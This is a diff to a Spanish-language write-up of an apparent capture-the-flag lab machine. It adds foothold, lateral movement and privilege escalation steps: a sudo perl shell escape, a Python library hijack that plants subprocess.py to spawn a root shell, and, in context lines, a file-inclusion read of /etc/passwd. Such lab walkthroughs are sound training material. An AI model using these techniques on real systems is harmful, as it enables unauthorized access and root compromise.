@@ -43,6 +43,9 @@ Como podemos ver <b>secret</b> es el parametro que esta haciendo el include, pri
 curl http://ip de la maquina/index.php?secret=/etc/passwd
 ```
 ![image](https://github.com/user-attachments/assets/f3820ae8-8ccb-46ee-aba3-6617ffb65217)
+<br>
+<h2>Foothold</h2>
+<hr>
 
 Podemos ver unas cuantas accounts, recordemos que la maquina cuenta con un servicio ssh, por lo tanto podemos realizar fuerza bruta a estas cuentas con hydra o buscar por las llaves. <br>
 
@@ -67,10 +70,114 @@ Ahora entonces teniendo el ssh podriamos logearnos al menos que nos pidan una fr
 >
 >El archivo id_rsa debe tener permisos 600.
 >
->Algunos id_rsa estan cifrados con un passphrase, que en ciertos casos necesitaras para que tu key sea aceptada
+>Algunos id_rsa estan cifrados con un passphrase, que en ciertos casos necesitaras para que tu key sea aceptada<br>
 
 
+![image](https://github.com/user-attachments/assets/919a1435-03f1-475a-a017-f15b279e44d6)
+
+<br>
+<h2>Lateral Movement</h2>
+<hr>
+
+De las primeras cosas que se suelen hacer en una maquina suele ser
+
+```bash
+sudo -l
+id
+Revisar /var/www/html
+ps aux
+etc
+```
+
+Con sudo -l nos saldra todos los permisos que podemos ejecutar como sudo si es que existe alguno, encontramos:
+<br>
+
+![image](https://github.com/user-attachments/assets/68746a92-227e-4048-b633-7394437417ff)
+
+<br>
+
+Ya que podemos ejecutar perl como luisillo, y al ser perl un lenguaje de programacion el proceso de escalado es sencillo con <a href="https://gtfobins.github.io/#">GTFOBins</a>
 
 
+```bash
+sudo -u luisillo perl -e 'exec "/bin/sh";'
+```
+<br>
 
+![image](https://github.com/user-attachments/assets/cf2a6c26-88a3-4e52-b6f7-0c6ccd0094d2)
 
+<br>
+<h2>Escalada de Privilegios</h2>
+<hr>
+
+Igual que el anterior probramos sudo -l <br>
+
+![image](https://github.com/user-attachments/assets/6f5712f2-6a00-45c4-8b06-edc0cb77f940)
+
+<br>
+
+Al parecer sudoers nos permite ejecutar el script mas no modificarlo.
+
+```python
+import subprocess
+import os
+import sys
+import time
+
+# F
+def dummy_function(data):
+    result = ""
+    for char in data:
+        result += char.upper() if char.islower() else char.lower()
+    return result
+
+# Código para ejecutar el script
+os.system("echo Ojo Aqui")
+
+# Simulación de procesamiento de datos
+def data_processing():
+    data = "This is some dummy data that needs to be processed."
+    processed_data = dummy_function(data)
+    print(f"Processed data: {processed_data}")
+
+# Simulación de un cálculo inútil
+def perform_useless_calculation():
+    result = 0
+    for i in range(1000000):
+        result += i
+    print(f"Useless calculation result: {result}")
+
+def run_command():
+    subprocess.run(['echo Hello!'], check=True)
+
+def main():
+    # Llamadas a funciones que no afectan el resultado final
+    data_processing()
+    perform_useless_calculation()
+    
+    # Comando real que se ejecuta
+    run_command()
+
+if __name__ == "__main__":
+    main()
+```
+
+Viendo el codigo vemos que las librerias se estan insertando de forma insegura, es ahi donde nosotros haremos un <a href="https://deephacking.tech/path-hijacking-y-library-hijacking/">Library Hijacking</a>.<br>
+
+Crearemos un archivo llamado subprocess.py de esta forma:
+
+```python
+import os
+os.system("/bin/bash -p")
+```
+<br>
+Ejecutamos de esta manera:
+<br>
+
+![image](https://github.com/user-attachments/assets/0623128d-d221-4f67-a670-a838b457fcb2)
+
+<br>
+
+y de esta manera finalizamos la maquina.
+
+HackTheBox: billyelcalvo
